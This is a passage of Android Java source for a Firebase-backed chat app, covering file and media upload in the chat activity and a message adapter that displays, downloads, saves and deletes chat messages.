                    type = list1.get(0).getFileExtensionFromMimeTypeWithoutDot();
                }

                //String path = getRealPath(p);

                InputStream stream = null;
                try {
                    stream = new FileInputStream(new File(String.valueOf(p)));
                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }

                uploadTask = chatStorageRef.child("chat_media").child(name).putStream(stream);
                Toast.makeText(ChatActivity.this, "Media Uploading, Please wait!!", Toast.LENGTH_SHORT).show();

                uploadTask.addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                    }
                }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // taskSnapshot.getMetadata() contains file metadata such as size, content-type, etc.
                        // ...

                        String fUri = String.valueOf(Objects.requireNonNull(taskSnapshot.getMetadata()).getDownloadUrl());
                        String fName = taskSnapshot.getMetadata().getName();
                        String fType = taskSnapshot.getMetadata().getContentType();
                        // ...
                        submitInChat("", "", "", "", "", "", "", fName, fUri, fType);
                    }
                });

            }

            @Override
            public void onError(String s) {
                showToast(s);
            }
        };

        mediaPicker.setMediaPickerCallback(mediaPickerCallback);
        mediaPicker.pickMedia();
    }

    private void showToast(String s) {
        Toast.makeText(this, s, Toast.LENGTH_SHORT).show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == Picker.PICK_IMAGE_DEVICE && resultCode == RESULT_OK) {
            imagePicker.submit(data);
        } else if (requestCode == Picker.PICK_FILE && resultCode == RESULT_OK) {
            filePicker.submit(data);
        } else if (requestCode == Picker.PICK_AUDIO && resultCode == RESULT_OK) {
            audioPicker.submit(data);
        } else if (requestCode == Picker.PICK_VIDEO_DEVICE && resultCode == RESULT_OK) {
            videoPicker.submit(data);
        } else if (requestCode == Picker.PICK_CONTACT && resultCode == RESULT_OK) {
            contactPicker.submit(data);
        } else if (requestCode == Picker.PICK_MEDIA && resultCode == RESULT_OK) {
            mediaPicker.submit(data);
        }

        //////////////////////////////////////

        try {
            String Fpath = data.getDataString();
            Uri Fpath1 = data.getData();

            File file = new File(Fpath1.getPath());
            DocumentFile df = DocumentFile.fromFile(file);

            InputStream stream = null;
            String name = "";

            if (df.canRead()) {
                try {
                    name = Fpath.substring(Fpath.lastIndexOf("/") + 1);
                    stream = new FileInputStream(new File(Fpath));

                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }
            } else {

                String s = getRealPath(this, Fpath1);

                name = s.substring(s.lastIndexOf("/") + 1);
                stream = new FileInputStream(new File(s));


                try {
                    stream = new FileInputStream(new File(s));

                } catch (FileNotFoundException e) {
                    e.printStackTrace();
                }
            }


            uploadTask = chatStorageRef.child("Raabta").child(name).putStream(stream);
            Toast.makeText(ChatActivity.this, "File Uploading, Please wait!!", Toast.LENGTH_SHORT).show();
            uploadTask.addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception exception) {
                    // Handle unsuccessful uploads
                }
            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @RequiresApi(api = Build.VERSION_CODES.KITKAT)
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    String fUri = String.valueOf(Objects.requireNonNull(taskSnapshot.getMetadata()).getDownloadUrl());
                    String fName = taskSnapshot.getMetadata().getName();
                    String fType = taskSnapshot.getMetadata().getContentType();
                    // ...
                    submitInChat("", "", "", "", "", "", "", fName, fUri, fType);
                }
            });


        } catch (Exception e) {
        }


    }
}

class ListMessageAdapter extends RecyclerView.Adapter<RecyclerView.ViewHolder> {

    private Context context;
    private Conversation consersation;
    private String roomId;
    private HashMap<String, Bitmap> bitmapAvata;
    private HashMap<String, DatabaseReference> bitmapAvataDB;
    private Bitmap bitmapAvataUser;

    LovelyProgressDialog dialogWaitDeleting;

    public ListMessageAdapter(Context context, Conversation consersation, HashMap<String, Bitmap> bitmapAvata, Bitmap bitmapAvataUser, String roomId) {
        this.context = context;
        this.consersation = consersation;
        this.bitmapAvata = bitmapAvata;
        this.bitmapAvataUser = bitmapAvataUser;
        this.roomId = roomId;
        bitmapAvataDB = new HashMap<>();

        dialogWaitDeleting = new LovelyProgressDialog(context);

        setHasStableIds(true);
    }

    @Override
    public RecyclerView.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
        if (viewType == ChatActivity.VIEW_TYPE_FRIEND_MESSAGE) {
            View view = LayoutInflater.from(context).inflate(R.layout.rc_item_message_friend, parent, false);
            return new ItemMessageFriendHolder(view);
        } else if (viewType == ChatActivity.VIEW_TYPE_USER_MESSAGE) {
            View view = LayoutInflater.from(context).inflate(R.layout.rc_item_message_user, parent, false);
            return new ItemMessageUserHolder(view);
        }
        return null;
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onBindViewHolder(final RecyclerView.ViewHolder holder, final int position) {


        // TODO: 13-06-2019 friend
        // FRIEND
        if (holder instanceof ItemMessageFriendHolder) {
            ((ItemMessageFriendHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
            String text = consersation.getListMessageData().get(position).text;
            // TODO: 26/4/20 new changed here *#file is only for friend msg not for user
            if (text.equalsIgnoreCase("~file~")||text.equalsIgnoreCase("*#~file~")) {

                ((ItemMessageFriendHolder) holder).txtContent.setVisibility(View.GONE);
                String num = consersation.getListMessageData().get(position).contactnumber;
                final String url = consersation.getListMessageData().get(position).filedownlodeurl;
                String type = consersation.getListMessageData().get(position).filetype;
                String lat = consersation.getListMessageData().get(position).latitude;
                String lon = consersation.getListMessageData().get(position).longitude;
                String pro = consersation.getListMessageData().get(position).provider;


                if (!(num.equalsIgnoreCase(""))) {
                    ((ItemMessageFriendHolder) holder).chatcontact.setVisibility(View.VISIBLE);
                    ((ItemMessageFriendHolder) holder).cnameContent.setText(consersation.getListMessageData().get(position).contactname);
                    ((ItemMessageFriendHolder) holder).cnumContent.setText(consersation.getListMessageData().get(position).contactnumber);


                    ((View) ((ItemMessageFriendHolder) holder).contactdownlode)
                            .setOnClickListener(new View.OnClickListener() {
                                @Override
                                public void onClick(View view) {

                                    final String name = consersation.getListMessageData().get(position).contactname;
                                    final String numb = consersation.getListMessageData().get(position).contactnumber;

                                    new AlertDialog.Builder(context)
                                            .setTitle("Save Contact")
                                            .setMessage("Are you sure want to save " + name + "?")
                                            .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                                @Override
                                                public void onClick(DialogInterface dialogInterface, int i) {
                                                    dialogInterface.dismiss();

                                                    try {
                                                        // File vcfFile = new File(this.getExternalFilesDir(null), "generated.vcf");
                                                        String VCF_DIRECTORY = "/Raabta";
                                                        File vdfdirectory = new File(
                                                                Environment.getExternalStorageDirectory() + VCF_DIRECTORY);
                                                        // have the object build the directory structure, if needed.
                                                        if (!vdfdirectory.exists()) {
                                                            vdfdirectory.mkdirs();
                                                        }

                                                        File vcfFile = new File(vdfdirectory, name + Calendar.getInstance().getTimeInMillis() + ".vcf");

                                                        FileWriter fw = null;
                                                        fw = new FileWriter(vcfFile);
                                                        fw.write("BEGIN:VCARD\r\n");
                                                        fw.write("VERSION:3.0\r\n");
                                                        // fw.write("N:" + p.getSurname() + ";" + p.getFirstName() + "\r\n");
                                                        fw.write("FN:" + name + "\r\n");
                                                        //  fw.write("ORG:" + p.getCompanyName() + "\r\n");
                                                        //  fw.write("TITLE:" + p.getTitle() + "\r\n");
                                                        fw.write("TEL;TYPE=WORK,VOICE:" + numb + "\r\n");
                                                        //   fw.write("TEL;TYPE=HOME,VOICE:" + p.getHomePhone() + "\r\n");
                                                        //   fw.write("ADR;TYPE=WORK:;;" + p.getStreet() + ";" + p.getCity() + ";" + p.getState() + ";" + p.getPostcode() + ";" + p.getCountry() + "\r\n");
                                                        fw.write("EMAIL;TYPE=PREF,INTERNET:" + name + "\r\n");
                                                        fw.write("END:VCARD\r\n");
                                                        fw.close();

                                                        Intent j = new Intent(); //this will import vcf in contact list
                                                        j.setAction(android.content.Intent.ACTION_VIEW);
                                                        j.setDataAndType(Uri.fromFile(vcfFile), "text/x-vcard");
                                                        context.startActivity(j);

                                                        Toast.makeText(context, "Created!", Toast.LENGTH_SHORT).show();
                                                    } catch (IOException e) {
                                                        e.printStackTrace();
                                                    }

                                                }
                                            })
                                            .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                                @Override
                                                public void onClick(DialogInterface dialogInterface, int i) {
                                                    dialogInterface.dismiss();
                                                }
                                            }).show();
                                }
                            });

                } else if (!(url.equalsIgnoreCase(""))) {
                    if (type.equalsIgnoreCase("image/jpeg") || type.equalsIgnoreCase("image/png")) {
                        ((ItemMessageFriendHolder) holder).imgContent.setVisibility(View.VISIBLE);

                        ImageView iv = ((ItemMessageFriendHolder) holder).imgContent;
                        Picasso.get().load(url).resize(600, 600).into(iv);
                        // TODO: 10/18/2018 download image using download image button click


                        ((View) ((ItemMessageFriendHolder) holder).imgContent)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {

                                        ViewDialog alert = new ViewDialog();
                                        alert.showDialog(context, url);

                                    }
                                });

                    } else {
                        ((ItemMessageFriendHolder) holder).chatfile.setVisibility(View.VISIBLE);
                        ((ItemMessageFriendHolder) holder).fileContent.setText(consersation.getListMessageData().get(position).filename);

                        final String fileurl = url;
                        ((View) ((ItemMessageFriendHolder) holder).filedownlode)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View view) {

                                        final String filename = consersation.getListMessageData().get(position).filename;

                                        String filePathString = Environment.getExternalStorageDirectory()+ "/" + "Raabta" + "/" +filename;
                                        File f = new File(filePathString);
                                        if(f.exists() && !f.isDirectory()) {
                                            // do something
                                            Intent openFile = new Intent(Intent.ACTION_VIEW);
                                            openFile.setData(Uri.fromFile(f));
                                            try {
                                                context.startActivity(openFile);
                                            } catch (ActivityNotFoundException e) {
                                                Log.i("asdf", "Cannot open file.");
                                            }
                                        } else {

                                            new AlertDialog.Builder(context)
                                                    .setTitle("download File")
                                                    .setMessage("Are you sure want to download " + filename + "?")
                                                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                            downlodeFile(filename, fileurl);

                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                        }
                                                    }).show();
                                        }

                                    }
                                });
                        ((View) ((ItemMessageFriendHolder) holder).chatfile)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View view) {

                                        final String filename = consersation.getListMessageData().get(position).filename;

                                        String filePathString = Environment.getExternalStorageDirectory()+ "/" + "Raabta" + "/" +filename;
                                        File f = new File(filePathString);
                                        if(f.exists() && !f.isDirectory()) {
                                            // do something
                                            Intent openFile = new Intent(Intent.ACTION_VIEW);
                                            openFile.setData(Uri.fromFile(f));
                                            try {
                                                context.startActivity(openFile);
                                            } catch (ActivityNotFoundException e) {
                                                Log.i("asdf", "Cannot open file.");
                                            }
                                        } else {

                                            new AlertDialog.Builder(context)
                                                    .setTitle("download File")
                                                    .setMessage("Are you sure want to download " + filename + "?")
                                                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                            downlodeFile(filename, fileurl);

                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                        }
                                                    }).show();
                                        }

                                    }
                                });
                    }
                } else if (!(lat.equalsIgnoreCase(""))) {
                    ((ItemMessageFriendHolder) holder).locContent.setVisibility(View.VISIBLE);
                    //lat lon pro

                    final float la = Float.parseFloat(lat);
                    final float lo = Float.parseFloat(lon);

                    ((View) ((ItemMessageFriendHolder) holder).locContent).setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {

                            String uri = String.format(Locale.ENGLISH, "geo:%f,%f", la, lo);
                            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                            context.startActivity(intent);
                        }
                    });
                }
            } else {


                Boolean isUrl = URLUtil.isValidUrl(consersation.getListMessageData().get(position).text) || Patterns.WEB_URL.matcher(consersation.getListMessageData().get(position).text).matches();
                if (isUrl) {
                    ((ItemMessageFriendHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
                    ((ItemMessageFriendHolder) holder).txtContent.setTextColor(Color.BLUE);
                    ((ItemMessageFriendHolder) holder).txtContent.setClickable(true);

                }

                else {

                    // TODO: 26/4/20 new changed here
                    if (text.contains("*#")) {
                        ((ItemMessageFriendHolder) holder).txtContent.setVisibility(View.GONE);
                        ((ItemMessageFriendHolder) holder).txtContent.setClickable(false);
                    }
                    else  /// normal text display here
                    {
                        ((ItemMessageFriendHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
                        ((ItemMessageFriendHolder) holder).txtContent.setClickable(false);
                    }
                }
                // TODO: 10/30/2018 counter 
                /*final String pushId = consersation.getListMessageData().get(position).pushId;
                FirebaseDatabase.getInstance().getReference().child("message/" + roomId).child(pushId).child("provider").setValue("");*/

            }

            ///// click url
            ((View) ((ItemMessageFriendHolder) holder).txtContent)
                    .setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {

                            String url = consersation.getListMessageData().get(position).text;
                            if (!url.contains("http")) {
                                url = "https://" + url;
                            }
                            Intent i = new Intent(Intent.ACTION_VIEW);
                            i.setData(Uri.parse(url));
                            Intent j = Intent.createChooser(i, "Choose an application to open with:");
                            context.startActivity(j);

                        }
                    });

            //////// for friend's display picture
            Bitmap currentAvata = bitmapAvata.get(consersation.getListMessageData().get(position).idSender);
            if (currentAvata != null) {
                ((ItemMessageFriendHolder) holder).avata.setImageBitmap(currentAvata);
            } else {
                final String id = consersation.getListMessageData().get(position).idSender;
                if (bitmapAvataDB.get(id) == null) {
                    bitmapAvataDB.put(id, FirebaseDatabase.getInstance().getReference().child("user/" + id + "/avata"));
                    bitmapAvataDB.get(id).addListenerForSingleValueEvent(new ValueEventListener() {
                        @Override
                        public void onDataChange(DataSnapshot dataSnapshot) {
                            if (dataSnapshot.getValue() != null) {
                                String avataStr = (String) dataSnapshot.getValue();
                                if (!avataStr.equals(StaticConfig.STR_DEFAULT_BASE64)) {
                                    byte[] decodedString = Base64.decode(avataStr, Base64.DEFAULT);
                                    ChatActivity.bitmapAvataFriend.put(id, BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length));
                                } else {
                                    ChatActivity.bitmapAvataFriend.put(id, BitmapFactory.decodeResource(context.getResources(), R.drawable.default_avata));
                                }
                                notifyDataSetChanged();
                            }
                        }

                        @Override
                        public void onCancelled(DatabaseError databaseError) {

                        }
                    });
                }
            }//////// frirnd's display picture ends

            Boolean invi = false; // get from savepref
            if (invi) {

                ((ItemMessageFriendHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                ((ItemMessageFriendHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                ((ItemMessageFriendHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                ((ItemMessageFriendHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                ((ItemMessageFriendHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                ;

                ((ItemMessageFriendHolder) holder).avata.setOnTouchListener(new View.OnTouchListener() {
                    @Override
                    public boolean onTouch(View view, MotionEvent motionEvent) {
                        switch (motionEvent.getAction()) {
                            case MotionEvent.ACTION_DOWN: {
                                // PRESSED

                                ((ItemMessageFriendHolder) holder).locContent.setForeground(null);
                                ((ItemMessageFriendHolder) holder).txtContent.setForeground(null);
                                ((ItemMessageFriendHolder) holder).chatcontact.setForeground(null);
                                ((ItemMessageFriendHolder) holder).chatfile.setForeground(null);
                                ((ItemMessageFriendHolder) holder).imgContent.setForeground(null);


                                return true; // if you want to handle the touch event
                            }
                            case MotionEvent.ACTION_UP: {
                                // RELEASED
                                ((ItemMessageFriendHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                return true; // if you want to handle the touch event
                            }
                            case MotionEvent.ACTION_CANCEL: {
                                //holder.confideimg.setForeground(context.getResources().getDrawable(R.drawable.single_chat_layout));
                                //Toast.makeText(context, "lll", Toast.LENGTH_SHORT).show();
                                ((ItemMessageFriendHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                ((ItemMessageFriendHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_friend_layout));
                                return true;
                            }
                        }
                        return false;
                    }
                });
            }


            // TODO: 13-06-2019 user
            // USER
        } else if (holder instanceof ItemMessageUserHolder) {

            ((ItemMessageUserHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
            String text = consersation.getListMessageData().get(position).text;

            String pro = consersation.getListMessageData().get(position).provider;
            // TODO: 10/29/2018 counter
            try {
                int count = Integer.parseInt(pro);
                SavePref savePref = new SavePref(context);
                savePref.setCounter(count);
                //Toast.makeText(context, pro, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {

            }


            Boolean isUrl = null;
            if (text.equalsIgnoreCase("~file~")) {

                ((ItemMessageUserHolder) holder).txtContent.setVisibility(View.GONE);
                String num = consersation.getListMessageData().get(position).contactnumber;
                final String url = consersation.getListMessageData().get(position).filedownlodeurl;
                String type = consersation.getListMessageData().get(position).filetype;
                final String lat = consersation.getListMessageData().get(position).latitude;
                final String lon = consersation.getListMessageData().get(position).longitude;


                if (!(num.equalsIgnoreCase(""))) {
                    ((ItemMessageUserHolder) holder).chatcontact.setVisibility(View.VISIBLE);
                    ((ItemMessageUserHolder) holder).cnameContent.setText(consersation.getListMessageData().get(position).contactname);
                    ((ItemMessageUserHolder) holder).cnumContent.setText(consersation.getListMessageData().get(position).contactnumber);
                    // TODO: 10/18/2018  set image click here for download
                } else if (!(url.equalsIgnoreCase(""))) {
                    if (type.equalsIgnoreCase("image/jpeg") || type.equalsIgnoreCase("image/png")) {
                        ((ItemMessageUserHolder) holder).imgContent.setVisibility(View.VISIBLE);

                        ImageView iv = ((ItemMessageUserHolder) holder).imgContent;
                        Picasso.get().load(url).resize(600, 600).into(iv);

                        ((View) ((ItemMessageUserHolder) holder).imgContent)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {

                                        ViewDialog alert = new ViewDialog();
                                        alert.showDialog(context, url);

                                    }
                                });

                    } else {
                        ((ItemMessageUserHolder) holder).chatfile.setVisibility(View.VISIBLE);
                        ((ItemMessageUserHolder) holder).fileContent.setText(consersation.getListMessageData().get(position).filename);
                        // TODO: 10/18/2018 download here using download image button click

                        final String fileurl = url;
                        ((View) ((ItemMessageUserHolder) holder).filedownlode)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View view) {

                                        final String filename = consersation.getListMessageData().get(position).filename;

                                        String filePathString = Environment.getExternalStorageDirectory()+ "/" + "Raabta" + "/" +filename;
                                        File f = new File(filePathString);
                                        if(f.exists() && !f.isDirectory()) {
                                            // do something
                                            Intent openFile = new Intent(Intent.ACTION_VIEW);
                                            openFile.setData(Uri.fromFile(f));
                                            try {
                                                context.startActivity(openFile);
                                            } catch (ActivityNotFoundException e) {
                                                Log.i("asdf", "Cannot open file.");
                                            }
                                        } else {

                                            new AlertDialog.Builder(context)
                                                    .setTitle("download File")
                                                    .setMessage("Are you sure want to download " + filename + "?")
                                                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                            downlodeFile(filename, fileurl);

                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                        }
                                                    }).show();
                                        }

                                    }
                                });
                        ((View) ((ItemMessageUserHolder) holder).chatfile)
                                .setOnClickListener(new View.OnClickListener() {
                                    @Override
                                    public void onClick(View view) {

                                        final String filename = consersation.getListMessageData().get(position).filename;

                                        String filePathString = Environment.getExternalStorageDirectory()+ "/" + "Raabta" + "/" +filename;
                                        File f = new File(filePathString);
                                        if(f.exists() && !f.isDirectory()) {
                                            // do something
                                            Intent openFile = new Intent(Intent.ACTION_VIEW);
                                            openFile.setData(Uri.fromFile(f));
                                            try {
                                                context.startActivity(openFile);
                                            } catch (ActivityNotFoundException e) {
                                                Log.i("asdf", "Cannot open file.");
                                            }
                                        } else {

                                            new AlertDialog.Builder(context)
                                                    .setTitle("download File")
                                                    .setMessage("Are you sure want to download " + filename + "?")
                                                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                            downlodeFile(filename, fileurl);

                                                        }
                                                    })
                                                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                                        @Override
                                                        public void onClick(DialogInterface dialogInterface, int i) {
                                                            dialogInterface.dismiss();
                                                        }
                                                    }).show();
                                        }

                                    }
                                });
                    }

                } else if (!(lat.equalsIgnoreCase(""))) {
                    ((ItemMessageUserHolder) holder).locContent.setVisibility(View.VISIBLE);
                    //lat lon pro

                    final float la = Float.parseFloat(lat);
                    final float lo = Float.parseFloat(lon);

                    ((View) ((ItemMessageUserHolder) holder).locContent).setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View view) {

                            try {
                                String uri = String.format(Locale.ENGLISH, "geo:%f,%f", la, lo);
                                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                                context.startActivity(intent);
                            } catch (Exception e) {
                                Toast.makeText(context, "Enable Google map in playstore", Toast.LENGTH_SHORT).show();
                            }
                        }
                    });
                }
            } else {
                isUrl = URLUtil.isValidUrl(consersation.getListMessageData().get(position).text) || Patterns.WEB_URL.matcher(consersation.getListMessageData().get(position).text).matches();
                if (isUrl) {
                    ((ItemMessageUserHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
                    ((ItemMessageUserHolder) holder).txtContent.setTextColor(Color.BLUE);
                    ((ItemMessageUserHolder) holder).txtContent.setClickable(true);

                } else {

                    // TODO: 26/4/20 new changed here
                    if (text.contains("*#")) {
                        ((ItemMessageUserHolder) holder).txtContent.setVisibility(View.GONE);
                        ((ItemMessageUserHolder) holder).txtContent.setClickable(false);
                    }
                    else  /// normal text display here
                    {
                        ((ItemMessageUserHolder) holder).txtContent.setText(consersation.getListMessageData().get(position).text);
                        ((ItemMessageUserHolder) holder).txtContent.setClickable(false);
                    }
                }
            }

            ///// display picture of user
            if (bitmapAvataUser != null) {
                ((ItemMessageUserHolder) holder).avata.setImageBitmap(bitmapAvataUser);
            }
            ///// delete self chat on long click
            ((View) ((ItemMessageUserHolder) holder).txtContent)
                    .setOnLongClickListener(new View.OnLongClickListener() {
                        @Override
                        public boolean onLongClick(final View view) {
                            final String chatName = (String) ((ItemMessageUserHolder) holder).txtContent.getText();
                            final String pushId = consersation.getListMessageData().get(position).pushId;

                            new AlertDialog.Builder(context)
                                    .setTitle("Delete Chat")
                                    .setMessage("Are you sure want to delete " + chatName + "?")
                                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialogInterface, int i) {
                                            dialogInterface.dismiss();
                                            FirebaseDatabase.getInstance().getReference().child("message/" + roomId).child(pushId).removeValue();
                                        }
                                    })
                                    .setNegativeButton(android.R.string.cancel, new DialogInterface.OnClickListener() {
                                        @Override
                                        public void onClick(DialogInterface dialogInterface, int i) {
                                            dialogInterface.dismiss();
                                        }
                                    }).show();

                            return true;
                        }
                    });

            ///// click url
            ((View) ((ItemMessageUserHolder) holder).txtContent)
                    .setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {

                            String url = consersation.getListMessageData().get(position).text;
                            if (!url.contains("http")) {
                                url = "https://" + url;
                            }
                            Intent i = new Intent(Intent.ACTION_VIEW);
                            i.setData(Uri.parse(url));
                            Intent j = Intent.createChooser(i, "Choose an application to open with:");
                            context.startActivity(j);

                        }
                    });

            Boolean invi = false; // get from savepref
            if (invi) {

                ((ItemMessageUserHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                ((ItemMessageUserHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                ((ItemMessageUserHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                ((ItemMessageUserHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                ((ItemMessageUserHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));

                ((ItemMessageUserHolder) holder).avata.setOnTouchListener(new View.OnTouchListener() {
                    @Override
                    public boolean onTouch(View view, MotionEvent motionEvent) {
                        switch (motionEvent.getAction()) {
                            case MotionEvent.ACTION_DOWN: {
                                // PRESSED

                                ((ItemMessageUserHolder) holder).locContent.setForeground(null);
                                ((ItemMessageUserHolder) holder).txtContent.setForeground(null);
                                ((ItemMessageUserHolder) holder).chatcontact.setForeground(null);
                                ((ItemMessageUserHolder) holder).chatfile.setForeground(null);
                                ((ItemMessageUserHolder) holder).imgContent.setForeground(null);


                                return true; // if you want to handle the touch event
                            }
                            case MotionEvent.ACTION_UP: {
                                // RELEASED
                                ((ItemMessageUserHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                return true; // if you want to handle the touch event
                            }
                            case MotionEvent.ACTION_CANCEL: {
                                //holder.confideimg.setForeground(context.getResources().getDrawable(R.drawable.single_chat_layout));
                                //Toast.makeText(context, "lll", Toast.LENGTH_SHORT).show();
                                ((ItemMessageUserHolder) holder).locContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).txtContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).chatcontact.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).chatfile.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                ((ItemMessageUserHolder) holder).imgContent.setForeground(context.getResources().getDrawable(R.drawable.hide_chat_user_layout));
                                return true;
                            }
                        }
                        return false;
                    }
                });
            }

        }


    }


    private void downlodeFile(String filename, String fileurl) {

        File sdCard = Environment.getExternalStorageDirectory();
        String folder = sdCard.getAbsolutePath() + "/Raabta";
        File dir = new File(folder);
        if (!dir.exists()) {
            try {
                dir.mkdir();
            } catch (Exception e) {
            }
        }

        DownloadManager downloadmanager = (DownloadManager) context.getSystemService(Context.DOWNLOAD_SERVICE);
        Uri uri = Uri.parse(fileurl);

        DownloadManager.Request request = new DownloadManager.Request(uri);
        request.setTitle("Raabta File");
        request.setDescription("Downloading");
        request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
        request.setVisibleInDownloadsUi(true);
        request.setDestinationInExternalPublicDir("/Raabta",filename);
        //request.setDestinationInExternalFilesDir(context, String.valueOf(dir),  "/" + filename);

        downloadmanager.enqueue(request);
    }


    @Override
    public int getItemViewType(int position) {
        int value = 0;
        try {
            value = consersation.getListMessageData().get(position).idSender.equals(StaticConfig.UID) ? ChatActivity.VIEW_TYPE_USER_MESSAGE : ChatActivity.VIEW_TYPE_FRIEND_MESSAGE;
        } catch (Exception e) {
            Toast.makeText(context, "" + e, Toast.LENGTH_SHORT).show();
        }
        return value;
    }

    @Override
    public int getItemCount() {
        return consersation.getListMessageData().size();
    }

    @Override
    public long getItemId(int position) {
        return position;
    }
}

